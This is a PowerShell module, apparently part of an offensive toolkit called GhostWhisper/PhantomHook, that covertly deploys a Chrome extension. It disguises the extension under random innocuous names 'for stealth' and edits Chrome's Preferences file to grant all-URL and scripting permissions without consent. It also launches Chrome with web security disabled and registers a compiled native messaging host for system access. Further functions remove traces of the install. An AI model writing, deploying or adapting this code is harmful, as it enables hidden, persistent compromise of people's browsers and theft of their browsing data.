# GhostBrowser.ps1
# Chrome Extension deployment and management for GhostWhisper Suite
# Integrates PhantomHook browser exploitation capabilities

function Test-ChromeInstalled {
    <#
    .SYNOPSIS
    Check if Chrome is installed on the system
    #>
    
    $chromePaths = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "${env:LOCALAPPDATA}\Google\Chrome\Application\chrome.exe",
        "/usr/bin/google-chrome",
        "/usr/bin/chromium-browser",
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    )
    
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            return $true
        }
    }
    
    return $false
}

function Get-ChromeUserDataPath {
    <#
    .SYNOPSIS
    Get Chrome user data directory path
    #>
    
    if ($IsWindows) {
        return "$env:LOCALAPPDATA\Google\Chrome\User Data"
    } elseif ($IsLinux) {
        return "$env:HOME/.config/google-chrome"
    } elseif ($IsMacOS) {
        return "$env:HOME/Library/Application Support/Google/Chrome"
    }
    
    return $null
}

function Install-GhostBrowserExtension {
    <#
    .SYNOPSIS
    Deploy PhantomHook browser extension
    #>
    param(
        [Parameter(Mandatory)]
        [string]$ExtensionType,  # "ghostcore", "discord", "ghostsurface"
        [string]$GhostTag = "Gx01",
        [switch]$Persistent,
        [string]$TargetProfile = "Default"
    )
    
    try {
        Write-GhostLog "Deploying GhostBrowser extension: $ExtensionType"
        
        # Verify operator authentication
        if (-not (Test-GhostAuth -Tag $GhostTag)) {
            Write-GhostLog "Unauthorized browser extension deployment attempt"
            return $false
        }
        
        # Check Chrome installation
        if (-not (Test-ChromeInstalled)) {
            Write-GhostLog "Chrome not found on system"
            return $false
        }
        
        # Get extension source path
        $extensionSource = switch ($ExtensionType.ToLower()) {
            "ghostcore" { Join-Path $PSScriptRoot "..\PhantomHook" }
            "discord" { Join-Path $PSScriptRoot "..\PhantomHook\Discord" }
            "ghostsurface" { Join-Path $PSScriptRoot "..\PhantomHook\GhostSurface" }
            default { 
                Write-GhostLog "Unknown extension type: $ExtensionType"
                return $false
            }
        }
        
        if (-not (Test-Path $extensionSource)) {
            Write-GhostLog "Extension source not found: $extensionSource"
            return $false
        }
        
        # Create staging directory
        $stagingDir = Join-Path $env:TEMP "ghost_browser_$(Get-Random)"
        New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
        
        try {
            # Copy extension files
            Copy-Item -Path "$extensionSource\*" -Destination $stagingDir -Recurse -Force
            
            # Customize extension with Ghost authentication
            Update-ExtensionManifest -ExtensionPath $stagingDir -GhostTag $GhostTag
            
            # Deploy extension
            if ($Persistent) {
                Install-PersistentExtension -ExtensionPath $stagingDir -Profile $TargetProfile -GhostTag $GhostTag
            } else {
                Install-TemporaryExtension -ExtensionPath $stagingDir -GhostTag $GhostTag
            }
            
            Write-GhostLog "Browser extension deployed successfully"
            return $true
            
        } finally {
            # Cleanup staging directory
            if (Test-Path $stagingDir) {
                Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
    } catch {
        Write-GhostLog "Browser extension deployment failed: $($_.Exception.Message)"
        return $false
    }
}

function Update-ExtensionManifest {
    <#
    .SYNOPSIS
    Customize extension manifest with Ghost authentication
    #>
    param(
        [string]$ExtensionPath,
        [string]$GhostTag
    )
    
    $manifestPath = Join-Path $ExtensionPath "Manifest.json"
    if (-not (Test-Path $manifestPath)) {
        return
    }
    
    try {
        $manifest = Get-Content $manifestPath | ConvertFrom-Json
        
        # Randomize extension name for stealth
        $randomNames = @(
            "Chrome PDF Viewer Helper",
            "Advanced Tab Manager",
            "Network Performance Monitor",
            "Security Certificate Checker",
            "Browser Health Diagnostic",
            "Web Developer Tools Extended"
        )
        
        $manifest.name = Get-Random -InputObject $randomNames
        $manifest.version = "$(Get-Random -Minimum 1 -Maximum 5).$(Get-Random -Minimum 0 -Maximum 10).$(Get-Random -Minimum 0 -Maximum 20)"
        
        # Add Ghost tag to description (hidden)
        $manifest.description = "Enhanced browser functionality with security features."
        
        # Save updated manifest
        $manifest | ConvertTo-Json -Depth 10 | Set-Content $manifestPath
        
        # Update background script with Ghost tag
        $backgroundPath = Join-Path $ExtensionPath "Background.js"
        if (Test-Path $backgroundPath) {
            $backgroundContent = Get-Content $backgroundPath -Raw
            
            # Inject Ghost tag into background script
            $ghostInit = @"
// Ghost authentication
const GHOST_TAG = '$GhostTag';
const GHOST_MAGIC = 0x47485354;

// Initialize Ghost context
chrome.storage.local.set({
    ghostTag: GHOST_TAG,
    ghostMagic: GHOST_MAGIC,
    ghostTimestamp: Date.now()
});

"@
            $updatedContent = $ghostInit + $backgroundContent
            Set-Content $backgroundPath -Value $updatedContent
        }
        
    } catch {
        Write-GhostLog "Failed to update extension manifest: $($_.Exception.Message)"
    }
}

function Install-TemporaryExtension {
    <#
    .SYNOPSIS
    Install extension in developer mode (temporary)
    #>
    param(
        [string]$ExtensionPath,
        [string]$GhostTag
    )
    
    try {
        Write-GhostLog "Installing temporary browser extension"
        
        # Launch Chrome with extension
        $chromeArgs = @(
            "--disable-extensions-file-access-check",
            "--load-extension=`"$ExtensionPath`"",
            "--disable-web-security",
            "--disable-features=TranslateUI",
            "--silent-debugger-extension-api"
        )
        
        $chromeExe = Get-ChromeExecutable
        if ($chromeExe) {
            Start-Process -FilePath $chromeExe -ArgumentList $chromeArgs -NoNewWindow
            Write-GhostLog "Chrome launched with Ghost extension"
        } else {
            Write-GhostLog "Chrome executable not found"
            return $false
        }
        
        return $true
        
    } catch {
        Write-GhostLog "Temporary extension installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Install-PersistentExtension {
    <#
    .SYNOPSIS
    Install extension persistently in Chrome profile
    #>
    param(
        [string]$ExtensionPath,
        [string]$Profile,
        [string]$GhostTag
    )
    
    try {
        Write-GhostLog "Installing persistent browser extension"
        
        $userDataPath = Get-ChromeUserDataPath
        if (-not $userDataPath -or -not (Test-Path $userDataPath)) {
            Write-GhostLog "Chrome user data path not found"
            return $false
        }
        
        $profilePath = Join-Path $userDataPath $Profile
        $extensionsPath = Join-Path $profilePath "Extensions"
        
        # Create extensions directory if it doesn't exist
        if (-not (Test-Path $extensionsPath)) {
            New-Item -ItemType Directory -Path $extensionsPath -Force | Out-Null
        }
        
        # Generate random extension ID
        $extensionId = Generate-ExtensionId
        $extensionDir = Join-Path $extensionsPath $extensionId
        
        # Create version directory
        $versionDir = Join-Path $extensionDir "1.0.0_0"
        New-Item -ItemType Directory -Path $versionDir -Force | Out-Null
        
        # Copy extension files
        Copy-Item -Path "$ExtensionPath\*" -Destination $versionDir -Recurse -Force
        
        # Update Chrome preferences to enable extension
        Update-ChromePreferences -ProfilePath $profilePath -ExtensionId $extensionId
        
        Write-GhostLog "Persistent extension installed with ID: $extensionId"
        return $true
        
    } catch {
        Write-GhostLog "Persistent extension installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Generate-ExtensionId {
    <#
    .SYNOPSIS
    Generate a Chrome extension ID (32 characters, a-p only)
    #>
    
    $chars = "abcdefghijklmnop"
    $id = ""
    for ($i = 0; $i -lt 32; $i++) {
        $id += Get-Random -InputObject $chars.ToCharArray()
    }
    return $id
}

function Update-ChromePreferences {
    <#
    .SYNOPSIS
    Update Chrome preferences to enable extension
    #>
    param(
        [string]$ProfilePath,
        [string]$ExtensionId
    )
    
    $prefsPath = Join-Path $ProfilePath "Preferences"
    if (-not (Test-Path $prefsPath)) {
        return
    }
    
    try {
        $prefs = Get-Content $prefsPath | ConvertFrom-Json
        
        # Initialize extensions section if it doesn't exist
        if (-not $prefs.extensions) {
            $prefs | Add-Member -NotePropertyName "extensions" -NotePropertyValue @{}
        }
        if (-not $prefs.extensions.settings) {
            $prefs.extensions | Add-Member -NotePropertyName "settings" -NotePropertyValue @{}
        }
        
        # Add extension settings
        $extensionSettings = @{
            "active_permissions" = @{
                "api" = @("offscreen", "storage", "scripting")
                "explicit_host" = @("<all_urls>")
            }
            "creation_flags" = 1
            "from_webstore" = $false
            "install_time" = [string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
            "location" = 4
            "manifest" = @{
                "name" = "Browser Security Extension"
                "version" = "1.0.0"
            }
            "path" = "Extensions\$ExtensionId\1.0.0_0"
            "state" = 1
            "was_installed_by_default" = $false
            "was_installed_by_oem" = $false
        }
        
        $prefs.extensions.settings | Add-Member -NotePropertyName $ExtensionId -NotePropertyValue $extensionSettings -Force
        
        # Save updated preferences
        $prefs | ConvertTo-Json -Depth 20 | Set-Content $prefsPath
        
    } catch {
        Write-GhostLog "Failed to update Chrome preferences: $($_.Exception.Message)"
    }
}

function Get-ChromeExecutable {
    <#
    .SYNOPSIS
    Get path to Chrome executable
    #>
    
    $chromePaths = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "${env:LOCALAPPDATA}\Google\Chrome\Application\chrome.exe",
        "/usr/bin/google-chrome",
        "/usr/bin/chromium-browser"
    )
    
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            return $path
        }
    }
    
    return $null
}

function Build-NativeMessagingHost {
    <#
    .SYNOPSIS
    Build and install native messaging host for system access
    #>
    param(
        [string]$GhostTag = "Gx01"
    )
    
    try {
        Write-GhostLog "Building native messaging host"
        
        $helperSource = Join-Path $PSScriptRoot "..\PhantomHook\Helper.txt"
        if (-not (Test-Path $helperSource)) {
            Write-GhostLog "Helper source not found"
            return $false
        }
        
        # Create build directory
        $buildDir = Join-Path $env:TEMP "ghost_host_$(Get-Random)"
        New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
        
        try {
            # Copy and rename helper source
            $helperCpp = Join-Path $buildDir "ghost_helper.cpp"
            Copy-Item $helperSource $helperCpp
            
            # Compile native host
            if ($IsWindows) {
                $result = Build-WindowsNativeHost -SourcePath $helperCpp -OutputDir $buildDir
            } else {
                $result = Build-LinuxNativeHost -SourcePath $helperCpp -OutputDir $buildDir
            }
            
            if ($result) {
                Install-NativeHostManifest -HostPath $result -GhostTag $GhostTag
                Write-GhostLog "Native messaging host installed"
                return $true
            }
            
        } finally {
            # Cleanup build directory
            if (Test-Path $buildDir) {
                Remove-Item -Path $buildDir -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
        return $false
        
    } catch {
        Write-GhostLog "Native host build failed: $($_.Exception.Message)"
        return $false
    }
}

function Build-WindowsNativeHost {
    param([string]$SourcePath, [string]$OutputDir)
    
    $outputExe = Join-Path $OutputDir "ghost_helper.exe"
    
    # Try to compile with cl.exe (Visual Studio)
    try {
        & cl.exe /EHsc /std:c++17 /Fe:"$outputExe" "$SourcePath" 2>$null
        if ($LASTEXITCODE -eq 0 -and (Test-Path $outputExe)) {
            return $outputExe
        }
    } catch { }
    
    # Try with g++ (MinGW)
    try {
        & g++ -std=c++17 -o "$outputExe" "$SourcePath" 2>$null
        if ($LASTEXITCODE -eq 0 -and (Test-Path $outputExe)) {
            return $outputExe
        }
    } catch { }
    
    Write-GhostLog "Failed to compile native host on Windows"
    return $null
}

function Build-LinuxNativeHost {
    param([string]$SourcePath, [string]$OutputDir)
    
    $outputBin = Join-Path $OutputDir "ghost_helper"
    
    try {
        & g++ -std=c++17 -o "$outputBin" "$SourcePath" 2>/dev/null
        if ($LASTEXITCODE -eq 0 -and (Test-Path $outputBin)) {
            & chmod +x "$outputBin"
            return $outputBin
        }
    } catch { }
    
    Write-GhostLog "Failed to compile native host on Linux"
    return $null
}

function Install-NativeHostManifest {
    param([string]$HostPath, [string]$GhostTag)
    
    $hostName = "com.ghost.helper"
    $manifest = @{
        "name" = $hostName
        "description" = "Browser Security Helper"
        "path" = $HostPath
        "type" = "stdio"
        "allowed_origins" = @(
            "chrome-extension://abcdefghijklmnopqrstuvwxyzabcdef/"
        )
    }
    
    # Install manifest in appropriate location
    if ($IsWindows) {
        $regPath = "HKEY_CURRENT_USER\SOFTWARE\Google\Chrome\NativeMessagingHosts\$hostName"
        $manifestPath = Join-Path $env:LOCALAPPDATA "ghost_$hostName.json"
        $manifest | ConvertTo-Json | Set-Content $manifestPath
        
        & reg add $regPath /ve /t REG_SZ /d "$manifestPath" /f 2>$null
    } else {
        $manifestDir = "$env:HOME/.config/google-chrome/NativeMessagingHosts"
        New-Item -ItemType Directory -Path $manifestDir -Force | Out-Null
        
        $manifestPath = Join-Path $manifestDir "$hostName.json"
        $manifest | ConvertTo-Json | Set-Content $manifestPath
    }
    
    Write-GhostLog "Native messaging manifest installed"
}

function Remove-GhostBrowserExtensions {
    <#
    .SYNOPSIS
    Remove all Ghost browser extensions and traces
    #>
    param([string]$GhostTag = "Gx01")
    
    try {
        Write-GhostLog "Removing Ghost browser extensions"
        
        $userDataPath = Get-ChromeUserDataPath
        if ($userDataPath -and (Test-Path $userDataPath)) {
            # Find and remove Ghost extensions
            $extensionsPath = Join-Path $userDataPath "*\Extensions"
            $ghostExtensions = Get-ChildItem $extensionsPath -Recurse -Filter "Background.js" -ErrorAction SilentlyContinue |
                Where-Object { (Get-Content $_.FullName -Raw) -match "GHOST_TAG|ghostTag" }
            
            foreach ($ext in $ghostExtensions) {
                $extDir = $ext.Directory.Parent
                Remove-Item -Path $extDir.FullName -Recurse -Force -ErrorAction SilentlyContinue
                Write-GhostLog "Removed extension: $($extDir.Name)"
            }
        }
        
        # Remove native messaging hosts
        if ($IsWindows) {
            & reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.ghost.helper" /f 2>$null
            Remove-Item "$env:LOCALAPPDATA\ghost_com.ghost.helper.json" -Force -ErrorAction SilentlyContinue
        } else {
            Remove-Item "$env:HOME/.config/google-chrome/NativeMessagingHosts/com.ghost.helper.json" -Force -ErrorAction SilentlyContinue
        }
        
        Write-GhostLog "Ghost browser extensions removed"
        return $true
        
    } catch {
        Write-GhostLog "Browser extension cleanup failed: $($_.Exception.Message)"
        return $false
    }
}

function Get-GhostBrowserStatus {
    <#
    .SYNOPSIS
    Get status of Ghost browser extensions
    #>
    
    try {
        $status = @{
            ChromeInstalled = (Test-ChromeInstalled)
            ExtensionsFound = 0
            ActiveExtensions = @()
            NativeHostInstalled = $false
        }
        
        $userDataPath = Get-ChromeUserDataPath
        if ($userDataPath -and (Test-Path $userDataPath)) {
            $extensionsPath = Join-Path $userDataPath "*\Extensions"
            $ghostExtensions = Get-ChildItem $extensionsPath -Recurse -Filter "Background.js" -ErrorAction SilentlyContinue |
                Where-Object { (Get-Content $_.FullName -Raw) -match "GHOST_TAG|ghostTag" }
            
            $status.ExtensionsFound = $ghostExtensions.Count
            $status.ActiveExtensions = $ghostExtensions | ForEach-Object { $_.Directory.Parent.Name }
        }
        
        # Check native host
        if ($IsWindows) {
            $status.NativeHostInstalled = (Test-Path "$env:LOCALAPPDATA\ghost_com.ghost.helper.json")
        } else {
            $status.NativeHostInstalled = (Test-Path "$env:HOME/.config/google-chrome/NativeMessagingHosts/com.ghost.helper.json")
        }
        
        return $status
        
    } catch {
        Write-GhostLog "Browser status check failed: $($_.Exception.Message)"
        return @{ ChromeInstalled = $false; ExtensionsFound = 0; ActiveExtensions = @(); NativeHostInstalled = $false }
    }
}

# Export functions for module loading
Export-ModuleMember -Function Install-GhostBrowserExtension, Build-NativeMessagingHost, Remove-GhostBrowserExtensions, Get-GhostBrowserStatus
